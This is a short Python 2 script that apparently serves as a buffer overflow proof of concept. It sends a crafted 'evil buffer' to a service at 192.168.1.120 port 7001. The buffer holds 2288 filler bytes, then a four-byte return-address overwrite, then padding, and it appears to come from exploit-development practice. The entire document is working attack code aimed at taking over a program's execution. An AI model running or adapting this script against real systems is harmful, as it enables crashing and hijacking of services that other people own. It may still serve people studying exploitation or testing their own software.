#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = buffer ="A"*2288 + "\xcf\x10\x80\x14"+"C" *(2560-2288-4)
 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.1.120", 7001))
  s.send(buffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"